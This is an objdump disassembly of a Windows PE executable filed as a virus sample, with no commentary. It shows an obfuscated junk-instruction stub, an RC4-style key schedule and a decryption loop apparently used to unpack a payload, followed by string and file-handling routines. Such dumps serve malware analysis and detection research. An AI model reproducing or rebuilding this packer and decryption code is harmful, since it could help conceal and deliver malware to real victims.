
malware_samples/virus/5d67421217598ead7df619e3b9ebc163d55302489c401a2cbe7257f0c3633f17.exe:     file format pei-i386


Disassembly of section .code:

00401000 <.code>:
  401000:	03 f7                	add    %edi,%esi
  401002:	84 c7                	test   %al,%bh
  401004:	8d 35 a2 56 86 32    	lea    0x328656a2,%esi
  40100a:	80 e3 e6             	and    $0xe6,%bl
  40100d:	87 d0                	xchg   %edx,%eax
  40100f:	22 d8                	and    %al,%bl
  401011:	0f b7 c3             	movzwl %bx,%eax
  401014:	b6 93                	mov    $0x93,%dh
  401016:	23 c6                	and    %esi,%eax
  401018:	77 06                	ja     0x401020
  40101a:	0f af dd             	imul   %ebp,%ebx
  40101d:	0f b6 e8             	movzbl %al,%ebp
  401020:	74 09                	je     0x40102b
  401022:	fe c6                	inc    %dh
  401024:	bd e0 f7 84 9f       	mov    $0x9f84f7e0,%ebp
  401029:	ff ca                	dec    %edx
  40102b:	e8 00 00 00 00       	call   0x401030
  401030:	85 f1                	test   %esi,%ecx
  401032:	71 09                	jno    0x40103d
  401034:	8b ce                	mov    %esi,%ecx
  401036:	ff c2                	inc    %edx
  401038:	be 15 cc 12 fe       	mov    $0xfe12cc15,%esi
  40103d:	c7 c2 bb 14 27 4b    	mov    $0x4b2714bb,%edx
  401043:	88 d7                	mov    %dl,%bh
  401045:	f2 84 c5             	repnz test %al,%ch
  401048:	81 f5 42 e9 00 00    	xor    $0xe942,%ebp
  40104e:	86 fc                	xchg   %bh,%ah
  401050:	f6 c7 69             	test   $0x69,%bh
  401053:	8b fa                	mov    %edx,%edi
  401055:	33 db                	xor    %ebx,%ebx
  401057:	0f be cf             	movsbl %bh,%ecx
  40105a:	fe cc                	dec    %ah
  40105c:	69 c7 6b 65 10 f3    	imul   $0xf310656b,%edi,%eax
  401062:	31 f6                	xor    %esi,%esi
  401064:	88 f6                	mov    %dh,%dh
  401066:	b2 97                	mov    $0x97,%dl
  401068:	0f af fe             	imul   %esi,%edi
  40106b:	f7 c0 06 d3 70 d6    	test   $0xd670d306,%eax
  401071:	84 e1                	test   %ah,%cl
  401073:	f2 be 0b f7 f0 ff    	repnz mov $0xfff0f70b,%esi
  401079:	f6 c4 de             	test   $0xde,%ah
  40107c:	81 f6 a3 23 00 00    	xor    $0x23a3,%esi
  401082:	fe ce                	dec    %dh
  401084:	ff c2                	inc    %edx
  401086:	81 f6 75 38 0f 00    	xor    $0xf3875,%esi
  40108c:	30 f2                	xor    %dh,%dl
  40108e:	88 e2                	mov    %ah,%dl
  401090:	f3 fe ce             	repz dec %dh
  401093:	89 ed                	mov    %ebp,%ebp
  401095:	03 fe                	add    %esi,%edi
  401097:	ff c2                	inc    %edx
  401099:	0f af ef             	imul   %edi,%ebp
  40109c:	f2 8b c6             	repnz mov %esi,%eax
  40109f:	bf 69 18 ac 4e       	mov    $0x4eac1869,%edi
  4010a4:	ff cf                	dec    %edi
  4010a6:	45                   	inc    %ebp
  4010a7:	05 b3 01 00 00       	add    $0x1b3,%eax
  4010ac:	f2 c6 c6 82          	repnz mov $0x82,%dh
  4010b0:	f2 8d 08             	repnz lea (%eax),%ecx
  4010b3:	03 d5                	add    %ebp,%edx
  4010b5:	81 c1 d5 05 00 00    	add    $0x5d5,%ecx
  4010bb:	8b f0                	mov    %eax,%esi
  4010bd:	c6 c2 c6             	mov    $0xc6,%dl
  4010c0:	09 ed                	or     %ebp,%ebp
  4010c2:	0f c1 cb             	xadd   %ecx,%ebx
  4010c5:	85 f5                	test   %esi,%ebp
  4010c7:	74 08                	je     0x4010d1
  4010c9:	01 c6                	add    %eax,%esi
  4010cb:	81 e8 51 60 4c 29    	sub    $0x294c6051,%eax
  4010d1:	81 c3 9c 0b 00 00    	add    $0xb9c,%ebx
  4010d7:	0f af c1             	imul   %ecx,%eax
  4010da:	85 d8                	test   %ebx,%eax
  4010dc:	8a eb                	mov    %bl,%ch
  4010de:	0f b7 d3             	movzwl %bx,%edx
  4010e1:	86 e6                	xchg   %ah,%dh
  4010e3:	41                   	inc    %ecx
  4010e4:	1b d3                	sbb    %ebx,%edx
  4010e6:	88 f5                	mov    %dh,%ch
  4010e8:	81 fb ce 01 00 00    	cmp    $0x1ce,%ebx
  4010ee:	0f 8c 63 ff ff ff    	jl     0x401057
  4010f4:	59                   	pop    %ecx
  4010f5:	88 c6                	mov    %al,%dh
  4010f7:	b3 a6                	mov    $0xa6,%bl
  4010f9:	8d 1d 9d 16 73 21    	lea    0x2173169d,%ebx
  4010ff:	85 cd                	test   %ecx,%ebp
  401101:	c7 c3 60 24 fa d7    	mov    $0xd7fa2460,%ebx
  401107:	fe ca                	dec    %dl
  401109:	0f be f5             	movsbl %ch,%esi
  40110c:	01 cb                	add    %ecx,%ebx
  40110e:	88 e3                	mov    %ah,%bl
  401110:	8d 05 a5 8c 1c 27    	lea    0x271c8ca5,%eax
  401116:	be e0 89 b1 3c       	mov    $0x3cb189e0,%esi
  40111b:	85 d6                	test   %edx,%esi
  40111d:	75 05                	jne    0x401124
  40111f:	ff c8                	dec    %eax
  401121:	80 dc a7             	sbb    $0xa7,%ah
  401124:	74 03                	je     0x401129
  401126:	4e                   	dec    %esi
  401127:	20 e8                	and    %ch,%al
  401129:	ff c7                	inc    %edi
  40112b:	fe c4                	inc    %ah
  40112d:	81 c1 c7 af 0d 00    	add    $0xdafc7,%ecx
  401133:	f7 c7 9f 85 7a 2d    	test   $0x2d7a859f,%edi
  401139:	0f b7 fb             	movzwl %bx,%edi
  40113c:	81 e7 82 5c 10 cd    	and    $0xcd105c82,%edi
  401142:	81 e9 b4 ef 0a 00    	sub    $0xaefb4,%ecx
  401148:	c7 c2 99 c5 33 25    	mov    $0x2533c599,%edx
  40114e:	89 e8                	mov    %ebp,%eax
  401150:	05 a0 15 1c 8c       	add    $0x8c1c15a0,%eax
  401155:	84 ff                	test   %bh,%bh
  401157:	b7 76                	mov    $0x76,%bh
  401159:	18 ec                	sbb    %ch,%ah
  40115b:	f6 c1 60             	test   $0x60,%cl
  40115e:	8d 3d eb a4 d1 0b    	lea    0xbd1a4eb,%edi
  401164:	88 f8                	mov    %bh,%al
  401166:	85 f7                	test   %esi,%edi
  401168:	33 d2                	xor    %edx,%edx
  40116a:	69 f8 e5 fc 76 63    	imul   $0x6376fce5,%eax,%edi
  401170:	34 59                	xor    $0x59,%al
  401172:	69 f7 97 b4 49 bb    	imul   $0xbb49b497,%edi,%esi
  401178:	40                   	inc    %eax
  401179:	3b e9                	cmp    %ecx,%ebp
  40117b:	70 05                	jo     0x401182
  40117d:	bb 66 f1 32 44       	mov    $0x4432f166,%ebx
  401182:	4e                   	dec    %esi
  401183:	fe c7                	inc    %bh
  401185:	8b c5                	mov    %ebp,%eax
  401187:	8d 3d f7 07 00 00    	lea    0x7f7,%edi
  40118d:	81 fd 52 9f f0 a2    	cmp    $0xa2f09f52,%ebp
  401193:	c7 c3 66 2b 9d bb    	mov    $0xbb9d2b66,%ebx
  401199:	24 36                	and    $0x36,%al
  40119b:	81 f7 92 0d 00 00    	xor    $0xd92,%edi
  4011a1:	8a e0                	mov    %al,%ah
  4011a3:	8d 2d 91 0f fe 57    	lea    0x57fe0f91,%ebp
  4011a9:	03 d7                	add    %edi,%edx
  4011ab:	88 c3                	mov    %al,%bl
  4011ad:	f6 c5 2f             	test   $0x2f,%ch
  4011b0:	b4 40                	mov    $0x40,%ah
  4011b2:	81 ea 64 0a 00 00    	sub    $0xa64,%edx
  4011b8:	f3 b7 41             	repz mov $0x41,%bh
  4011bb:	1a dd                	sbb    %ch,%bl
  4011bd:	80 e7 79             	and    $0x79,%bh
  4011c0:	8a e6                	mov    %dh,%ah
  4011c2:	81 fa 0e 09 00 00    	cmp    $0x90e,%edx
  4011c8:	0f 82 9c ff ff ff    	jb     0x40116a
  4011ce:	84 c2                	test   %al,%dl
  4011d0:	bd 33 2e 9e e5       	mov    $0xe59e2e33,%ebp
  4011d5:	68 fc 6e 9f 00       	push   $0x9f6efc
  4011da:	84 d3                	test   %dl,%bl
  4011dc:	2b f2                	sub    %edx,%esi
  4011de:	51                   	push   %ecx
  4011df:	80 d8 63             	sbb    $0x63,%al
  4011e2:	c3                   	ret
  4011e3:	00 00                	add    %al,(%eax)
  4011e5:	00 83 ec 04 c7 04    	add    %al,0x4c704ec(%ebx)
  4011eb:	24 00                	and    $0x0,%al
  4011ed:	00 00                	add    %al,(%eax)
  4011ef:	00 4a 75             	add    %cl,0x75(%edx)
  4011f2:	f3 8b 54 24 58       	repz mov 0x58(%esp),%edx
  4011f7:	8d 0c 24             	lea    (%esp),%ecx
  4011fa:	e8 61 3e 00 00       	call   0x405060
  4011ff:	ff 34 24             	push   (%esp)
  401202:	e8 f9 44 00 00       	call   0x405700
  401207:	89 44 24 04          	mov    %eax,0x4(%esp)
  40120b:	ff 74 24 04          	push   0x4(%esp)
  40120f:	e8 4c 89 00 00       	call   0x409b60
  401214:	89 44 24 08          	mov    %eax,0x8(%esp)
  401218:	8d 54 24 0c          	lea    0xc(%esp),%edx
  40121c:	52                   	push   %edx
  40121d:	68 00 00 00 00       	push   $0x0
  401222:	68 05 00 00 00       	push   $0x5
  401227:	68 00 01 00 00       	push   $0x100
  40122c:	68 04 00 00 00       	push   $0x4
  401231:	e8 94 c9 00 00       	call   0x40dbca
  401236:	8d 54 24 14          	lea    0x14(%esp),%edx
  40123a:	52                   	push   %edx
  40123b:	68 00 00 00 00       	push   $0x0
  401240:	68 05 00 00 00       	push   $0x5
  401245:	68 00 01 00 00       	push   $0x100
  40124a:	68 04 00 00 00       	push   $0x4
  40124f:	e8 76 c9 00 00       	call   0x40dbca
  401254:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  40125b:	00 
  40125c:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%esp)
  401263:	00 
  401264:	c7 44 24 24 00 00 00 	movl   $0x0,0x24(%esp)
  40126b:	00 
  40126c:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%esp)
  401273:	00 
  401274:	c7 44 24 2c 00 00 00 	movl   $0x0,0x2c(%esp)
  40127b:	00 
  40127c:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%esp)
  401283:	00 
  401284:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%esp)
  40128b:	00 
  40128c:	c7 44 24 08 20 00 00 	movl   $0x20,0x8(%esp)
  401293:	00 
  401294:	ff 74 24 0c          	push   0xc(%esp)
  401298:	58                   	pop    %eax
  401299:	89 44 24 34          	mov    %eax,0x34(%esp)
  40129d:	ff 74 24 04          	push   0x4(%esp)
  4012a1:	58                   	pop    %eax
  4012a2:	89 44 24 38          	mov    %eax,0x38(%esp)
  4012a6:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  4012ad:	00 
  4012ae:	eb 00                	jmp    0x4012b0
  4012b0:	b8 ff 00 00 00       	mov    $0xff,%eax
  4012b5:	3b 44 24 1c          	cmp    0x1c(%esp),%eax
  4012b9:	7c 54                	jl     0x40130f
  4012bb:	ff 74 24 1c          	push   0x1c(%esp)
  4012bf:	8b 6c 24 38          	mov    0x38(%esp),%ebp
  4012c3:	58                   	pop    %eax
  4012c4:	89 45 00             	mov    %eax,0x0(%ebp)
  4012c7:	8b 5c 24 34          	mov    0x34(%esp),%ebx
  4012cb:	83 c3 04             	add    $0x4,%ebx
  4012ce:	89 5c 24 34          	mov    %ebx,0x34(%esp)
  4012d2:	8b 6c 24 38          	mov    0x38(%esp),%ebp
  4012d6:	0f be 5d 00          	movsbl 0x0(%ebp),%ebx
  4012da:	21 db                	and    %ebx,%ebx
  4012dc:	75 09                	jne    0x4012e7
  4012de:	ff 74 24 04          	push   0x4(%esp)
  4012e2:	58                   	pop    %eax
  4012e3:	89 44 24 38          	mov    %eax,0x38(%esp)
  4012e7:	8b 6c 24 38          	mov    0x38(%esp),%ebp
  4012eb:	0f be 45 00          	movsbl 0x0(%ebp),%eax
  4012ef:	50                   	push   %eax
  4012f0:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  4012f4:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  4012f8:	c1 e3 02             	shl    $0x2,%ebx
  4012fb:	58                   	pop    %eax
  4012fc:	89 44 1d 00          	mov    %eax,0x0(%ebp,%ebx,1)
  401300:	8b 5c 24 38          	mov    0x38(%esp),%ebx
  401304:	43                   	inc    %ebx
  401305:	89 5c 24 38          	mov    %ebx,0x38(%esp)
  401309:	ff 44 24 1c          	incl   0x1c(%esp)
  40130d:	71 a1                	jno    0x4012b0
  40130f:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%esp)
  401316:	00 
  401317:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  40131e:	00 
  40131f:	eb 00                	jmp    0x401321
  401321:	b8 ff 00 00 00       	mov    $0xff,%eax
  401326:	3b 44 24 1c          	cmp    0x1c(%esp),%eax
  40132a:	7c 6d                	jl     0x401399
  40132c:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  401330:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
  401334:	8b 6c 24 0c          	mov    0xc(%esp),%ebp
  401338:	c1 e7 02             	shl    $0x2,%edi
  40133b:	03 5c 3d 00          	add    0x0(%ebp,%edi,1),%ebx
  40133f:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
  401343:	8b 6c 24 14          	mov    0x14(%esp),%ebp
  401347:	c1 e7 02             	shl    $0x2,%edi
  40134a:	03 5c 3d 00          	add    0x0(%ebp,%edi,1),%ebx
  40134e:	81 e3 ff 00 00 00    	and    $0xff,%ebx
  401354:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  401358:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  40135c:	8b 6c 24 0c          	mov    0xc(%esp),%ebp
  401360:	c1 e3 02             	shl    $0x2,%ebx
  401363:	ff 74 1d 00          	push   0x0(%ebp,%ebx,1)
  401367:	58                   	pop    %eax
  401368:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  40136c:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  401370:	c1 e3 02             	shl    $0x2,%ebx
  401373:	ff 74 1d 00          	push   0x0(%ebp,%ebx,1)
  401377:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  40137b:	c1 e3 02             	shl    $0x2,%ebx
  40137e:	58                   	pop    %eax
  40137f:	89 44 1d 00          	mov    %eax,0x0(%ebp,%ebx,1)
  401383:	ff 74 24 2c          	push   0x2c(%esp)
  401387:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  40138b:	c1 e3 02             	shl    $0x2,%ebx
  40138e:	58                   	pop    %eax
  40138f:	89 44 1d 00          	mov    %eax,0x0(%ebp,%ebx,1)
  401393:	ff 44 24 1c          	incl   0x1c(%esp)
  401397:	71 88                	jno    0x401321
  401399:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  4013a0:	00 
  4013a1:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%esp)
  4013a8:	00 
  4013a9:	ff 74 24 50          	push   0x50(%esp)
  4013ad:	58                   	pop    %eax
  4013ae:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  4013b2:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%esp)
  4013b9:	00 
  4013ba:	eb 00                	jmp    0x4013bc
  4013bc:	8b 5c 24 54          	mov    0x54(%esp),%ebx
  4013c0:	4b                   	dec    %ebx
  4013c1:	3b 5c 24 28          	cmp    0x28(%esp),%ebx
  4013c5:	0f 8c c3 00 00 00    	jl     0x40148e
  4013cb:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  4013cf:	43                   	inc    %ebx
  4013d0:	81 e3 ff 00 00 00    	and    $0xff,%ebx
  4013d6:	89 5c 24 1c          	mov    %ebx,0x1c(%esp)
  4013da:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  4013de:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
  4013e2:	8b 6c 24 0c          	mov    0xc(%esp),%ebp
  4013e6:	c1 e7 02             	shl    $0x2,%edi
  4013e9:	03 5c 3d 00          	add    0x0(%ebp,%edi,1),%ebx
  4013ed:	81 e3 ff 00 00 00    	and    $0xff,%ebx
  4013f3:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  4013f7:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  4013fb:	c1 e3 02             	shl    $0x2,%ebx
  4013fe:	ff 74 1d 00          	push   0x0(%ebp,%ebx,1)
  401402:	58                   	pop    %eax
  401403:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  401407:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  40140b:	c1 e3 02             	shl    $0x2,%ebx
  40140e:	ff 74 1d 00          	push   0x0(%ebp,%ebx,1)
  401412:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  401416:	c1 e3 02             	shl    $0x2,%ebx
  401419:	58                   	pop    %eax
  40141a:	89 44 1d 00          	mov    %eax,0x0(%ebp,%ebx,1)
  40141e:	ff 74 24 2c          	push   0x2c(%esp)
  401422:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  401426:	c1 e3 02             	shl    $0x2,%ebx
  401429:	58                   	pop    %eax
  40142a:	89 44 1d 00          	mov    %eax,0x0(%ebp,%ebx,1)
  40142e:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  401432:	c1 e3 02             	shl    $0x2,%ebx
  401435:	8b 5c 1d 00          	mov    0x0(%ebp,%ebx,1),%ebx
  401439:	8b 7c 24 20          	mov    0x20(%esp),%edi
  40143d:	c1 e7 02             	shl    $0x2,%edi
  401440:	8b 7c 3d 00          	mov    0x0(%ebp,%edi,1),%edi
  401444:	81 e7 ff 00 00 00    	and    $0xff,%edi
  40144a:	01 fb                	add    %edi,%ebx
  40144c:	81 e3 ff 00 00 00    	and    $0xff,%ebx
  401452:	89 5c 24 24          	mov    %ebx,0x24(%esp)
  401456:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  40145a:	c1 e3 02             	shl    $0x2,%ebx
  40145d:	ff 74 1d 00          	push   0x0(%ebp,%ebx,1)
  401461:	58                   	pop    %eax
  401462:	89 44 24 30          	mov    %eax,0x30(%esp)
  401466:	8b 6c 24 3c          	mov    0x3c(%esp),%ebp
  40146a:	0f be 5d 00          	movsbl 0x0(%ebp),%ebx
  40146e:	33 5c 24 30          	xor    0x30(%esp),%ebx
  401472:	53                   	push   %ebx
  401473:	8b 6c 24 40          	mov    0x40(%esp),%ebp
  401477:	58                   	pop    %eax
  401478:	88 45 00             	mov    %al,0x0(%ebp)
  40147b:	8b 5c 24 3c          	mov    0x3c(%esp),%ebx
  40147f:	43                   	inc    %ebx
  401480:	89 5c 24 3c          	mov    %ebx,0x3c(%esp)
  401484:	ff 44 24 28          	incl   0x28(%esp)
  401488:	0f 81 2e ff ff ff    	jno    0x4013bc
  40148e:	8d 54 24 0c          	lea    0xc(%esp),%edx
  401492:	52                   	push   %edx
  401493:	68 00 00 00 00       	push   $0x0
  401498:	68 05 00 00 00       	push   $0x5
  40149d:	68 01 00 00 00       	push   $0x1
  4014a2:	68 04 00 00 00       	push   $0x4
  4014a7:	e8 1e c7 00 00       	call   0x40dbca
  4014ac:	8d 54 24 14          	lea    0x14(%esp),%edx
  4014b0:	52                   	push   %edx
  4014b1:	68 00 00 00 00       	push   $0x0
  4014b6:	68 05 00 00 00       	push   $0x5
  4014bb:	68 01 00 00 00       	push   $0x1
  4014c0:	68 04 00 00 00       	push   $0x4
  4014c5:	e8 00 c7 00 00       	call   0x40dbca
  4014ca:	ff 74 24 04          	push   0x4(%esp)
  4014ce:	e8 ad 86 00 00       	call   0x409b80
  4014d3:	8b 44 24 50          	mov    0x50(%esp),%eax
  4014d7:	eb 02                	jmp    0x4014db
  4014d9:	31 c0                	xor    %eax,%eax
  4014db:	ff 34 24             	push   (%esp)
  4014de:	e8 6d ca 00 00       	call   0x40df50
  4014e3:	50                   	push   %eax
  4014e4:	ff 74 24 10          	push   0x10(%esp)
  4014e8:	e8 30 c8 00 00       	call   0x40dd1d
  4014ed:	ff 74 24 18          	push   0x18(%esp)
  4014f1:	e8 27 c8 00 00       	call   0x40dd1d
  4014f6:	58                   	pop    %eax
  4014f7:	83 c4 40             	add    $0x40,%esp
  4014fa:	5f                   	pop    %edi
  4014fb:	5b                   	pop    %ebx
  4014fc:	5d                   	pop    %ebp
  4014fd:	c2 0c 00             	ret    $0xc
  401500:	55                   	push   %ebp
  401501:	53                   	push   %ebx
  401502:	ba 0b 00 00 00       	mov    $0xb,%edx
  401507:	83 ec 04             	sub    $0x4,%esp
  40150a:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  401511:	4a                   	dec    %edx
  401512:	75 f3                	jne    0x401507
  401514:	e8 a7 ca 00 00       	call   0x40dfc0
  401519:	8b 1d 94 80 41 00    	mov    0x418094,%ebx
  40151f:	83 fb 01             	cmp    $0x1,%ebx
  401522:	0f 85 32 01 00 00    	jne    0x40165a
  401528:	8b 1d 7c 80 41 00    	mov    0x41807c,%ebx
  40152e:	83 fb 01             	cmp    $0x1,%ebx
  401531:	75 12                	jne    0x401545
  401533:	8b 1d 68 80 41 00    	mov    0x418068,%ebx
  401539:	83 fb 01             	cmp    $0x1,%ebx
  40153c:	74 07                	je     0x401545
  40153e:	b8 01 00 00 00       	mov    $0x1,%eax
  401543:	eb 02                	jmp    0x401547
  401545:	31 c0                	xor    %eax,%eax
  401547:	21 c0                	and    %eax,%eax
  401549:	0f 84 06 01 00 00    	je     0x401655
  40154f:	b8 26 70 41 00       	mov    $0x417026,%eax
  401554:	50                   	push   %eax
  401555:	ff 35 90 80 41 00    	push   0x418090
  40155b:	e8 00 42 00 00       	call   0x405760
  401560:	89 04 24             	mov    %eax,(%esp)
  401563:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  40156a:	00 
  40156b:	eb 00                	jmp    0x40156d
  40156d:	8b 04 24             	mov    (%esp),%eax
  401570:	3b 44 24 04          	cmp    0x4(%esp),%eax
  401574:	0f 8c 92 00 00 00    	jl     0x40160c
  40157a:	52                   	push   %edx
  40157b:	e8 00 c9 00 00       	call   0x40de80
  401580:	5a                   	pop    %edx
  401581:	50                   	push   %eax
  401582:	52                   	push   %edx
  401583:	e8 f8 c8 00 00       	call   0x40de80
  401588:	5a                   	pop    %edx
  401589:	50                   	push   %eax
  40158a:	b8 66 70 41 00       	mov    $0x417066,%eax
  40158f:	50                   	push   %eax
  401590:	ff 74 24 10          	push   0x10(%esp)
  401594:	ff 35 90 80 41 00    	push   0x418090
  40159a:	e8 51 42 00 00       	call   0x4057f0
  40159f:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4015a3:	50                   	push   %eax
  4015a4:	e8 17 c9 00 00       	call   0x40dec0
  4015a9:	ff 74 24 08          	push   0x8(%esp)
  4015ad:	e8 e9 0e 00 00       	call   0x40249b
  4015b2:	21 c0                	and    %eax,%eax
  4015b4:	74 4c                	je     0x401602
  4015b6:	52                   	push   %edx
  4015b7:	e8 c4 c8 00 00       	call   0x40de80
  4015bc:	5a                   	pop    %edx
  4015bd:	50                   	push   %eax
  4015be:	ff 74 24 0c          	push   0xc(%esp)
  4015c2:	e8 33 16 00 00       	call   0x402bfa
  4015c7:	8d 44 24 10          	lea    0x10(%esp),%eax
  4015cb:	50                   	push   %eax
  4015cc:	e8 ef c8 00 00       	call   0x40dec0
  4015d1:	8b 54 24 10          	mov    0x10(%esp),%edx
  4015d5:	52                   	push   %edx
  4015d6:	e8 a5 c8 00 00       	call   0x40de80
  4015db:	5a                   	pop    %edx
  4015dc:	50                   	push   %eax
  4015dd:	52                   	push   %edx
  4015de:	e8 3d ca 00 00       	call   0x40e020
  4015e3:	8b 54 24 10          	mov    0x10(%esp),%edx
  4015e7:	52                   	push   %edx
  4015e8:	e8 33 ca 00 00       	call   0x40e020
  4015ed:	ba 66 70 41 00       	mov    $0x417066,%edx
  4015f2:	52                   	push   %edx
  4015f3:	e8 28 ca 00 00       	call   0x40e020
  4015f8:	8d 44 24 14          	lea    0x14(%esp),%eax
  4015fc:	50                   	push   %eax
  4015fd:	e8 be c8 00 00       	call   0x40dec0
  401602:	ff 44 24 04          	incl   0x4(%esp)
  401606:	0f 81 61 ff ff ff    	jno    0x40156d
  40160c:	ff 74 24 10          	push   0x10(%esp)
  401610:	e8 eb 40 00 00       	call   0x405700
  401615:	89 44 24 14          	mov    %eax,0x14(%esp)
  401619:	68 00 00 00 00       	push   $0x0
  40161e:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  401622:	50                   	push   %eax
  401623:	ff 74 24 1c          	push   0x1c(%esp)
  401627:	e8 34 85 00 00       	call   0x409b60
  40162c:	50                   	push   %eax
  40162d:	ff 74 24 20          	push   0x20(%esp)
  401631:	ff 35 3c 80 41 00    	push   0x41803c
  401637:	e8 58 3a 00 00       	call   0x405094
  40163c:	ff 74 24 14          	push   0x14(%esp)
  401640:	e8 3b 85 00 00       	call   0x409b80
  401645:	ba 24 70 41 00       	mov    $0x417024,%edx
  40164a:	8d 0d 90 80 41 00    	lea    0x418090,%ecx
  401650:	e8 13 3a 00 00       	call   0x405068
  401655:	e9 ce 02 00 00       	jmp    0x401928
  40165a:	c7 05 94 80 41 00 01 	movl   $0x1,0x418094
  401661:	00 00 00 
  401664:	c7 44 24 1c 01 00 00 	movl   $0x1,0x1c(%esp)
  40166b:	00 
  40166c:	52                   	push   %edx
  40166d:	e8 0e c8 00 00       	call   0x40de80
  401672:	5a                   	pop    %edx
  401673:	50                   	push   %eax
  401674:	52                   	push   %edx
  401675:	e8 06 c8 00 00       	call   0x40de80
  40167a:	5a                   	pop    %edx
  40167b:	50                   	push   %eax
  40167c:	b8 2e 70 41 00       	mov    $0x41702e,%eax
  401681:	50                   	push   %eax
  401682:	ff 74 24 28          	push   0x28(%esp)
  401686:	ff 35 24 80 41 00    	push   0x418024
  40168c:	e8 5f 41 00 00       	call   0x4057f0
  401691:	8d 44 24 14          	lea    0x14(%esp),%eax
  401695:	50                   	push   %eax
  401696:	e8 25 c8 00 00       	call   0x40dec0
  40169b:	b8 32 70 41 00       	mov    $0x417032,%eax
  4016a0:	50                   	push   %eax
  4016a1:	ff 74 24 14          	push   0x14(%esp)
  4016a5:	e8 16 43 00 00       	call   0x4059c0
  4016aa:	89 44 24 20          	mov    %eax,0x20(%esp)
  4016ae:	83 7c 24 20 00       	cmpl   $0x0,0x20(%esp)
  4016b3:	74 5c                	je     0x401711
  4016b5:	52                   	push   %edx
  4016b6:	e8 c5 c7 00 00       	call   0x40de80
  4016bb:	5a                   	pop    %edx
  4016bc:	50                   	push   %eax
  4016bd:	52                   	push   %edx
  4016be:	e8 bd c7 00 00       	call   0x40de80
  4016c3:	5a                   	pop    %edx
  4016c4:	50                   	push   %eax
  4016c5:	b8 32 70 41 00       	mov    $0x417032,%eax
  4016ca:	50                   	push   %eax
  4016cb:	68 02 00 00 00       	push   $0x2
  4016d0:	ff 74 24 20          	push   0x20(%esp)
  4016d4:	e8 17 41 00 00       	call   0x4057f0
  4016d9:	8d 44 24 28          	lea    0x28(%esp),%eax
  4016dd:	50                   	push   %eax
  4016de:	e8 dd c7 00 00       	call   0x40dec0
  4016e3:	52                   	push   %edx
  4016e4:	e8 97 c7 00 00       	call   0x40de80
  4016e9:	5a                   	pop    %edx
  4016ea:	50                   	push   %eax
  4016eb:	52                   	push   %edx
  4016ec:	e8 8f c7 00 00       	call   0x40de80
  4016f1:	5a                   	pop    %edx
  4016f2:	50                   	push   %eax
  4016f3:	b8 32 70 41 00       	mov    $0x417032,%eax
  4016f8:	50                   	push   %eax
  4016f9:	68 01 00 00 00       	push   $0x1
  4016fe:	ff 74 24 20          	push   0x20(%esp)
  401702:	e8 e9 40 00 00       	call   0x4057f0
  401707:	8d 44 24 14          	lea    0x14(%esp),%eax
  40170b:	50                   	push   %eax
  40170c:	e8 af c7 00 00       	call   0x40dec0
  401711:	8b 54 24 10          	mov    0x10(%esp),%edx
  401715:	31 c9                	xor    %ecx,%ecx
  401717:	e8 04 3a 00 00       	call   0x405120
  40171c:	0f 85 ee 01 00 00    	jne    0x401910
  401722:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  401726:	89 d8                	mov    %ebx,%eax
  401728:	b9 02 00 00 00       	mov    $0x2,%ecx
  40172d:	99                   	cltd
  40172e:	f7 f9                	idiv   %ecx
  401730:	89 d3                	mov    %edx,%ebx
  401732:	21 db                	and    %ebx,%ebx
  401734:	75 2b                	jne    0x401761
  401736:	ff 74 24 10          	push   0x10(%esp)
  40173a:	e8 a1 42 00 00       	call   0x4059e0
  40173f:	50                   	push   %eax
  401740:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  401744:	8b 2d 98 80 41 00    	mov    0x418098,%ebp
  40174a:	6b db 0c             	imul   $0xc,%ebx,%ebx
  40174d:	01 dd                	add    %ebx,%ebp
  40174f:	58                   	pop    %eax
  401750:	89 45 08             	mov    %eax,0x8(%ebp)
  401753:	8b 5c 24 04          	mov    0x4(%esp),%ebx
  401757:	43                   	inc    %ebx
  401758:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  40175c:	e9 ad 01 00 00       	jmp    0x40190e
  401761:	52                   	push   %edx
  401762:	e8 19 c7 00 00       	call   0x40de80
  401767:	5a                   	pop    %edx
  401768:	50                   	push   %eax
  401769:	52                   	push   %edx
  40176a:	e8 11 c7 00 00       	call   0x40de80
  40176f:	5a                   	pop    %edx
  401770:	50                   	push   %eax
  401771:	68 01 00 00 00       	push   $0x1
  401776:	ff 74 24 1c          	push   0x1c(%esp)
  40177a:	e8 a1 43 00 00       	call   0x405b20
  40177f:	e8 fc c8 00 00       	call   0x40e080
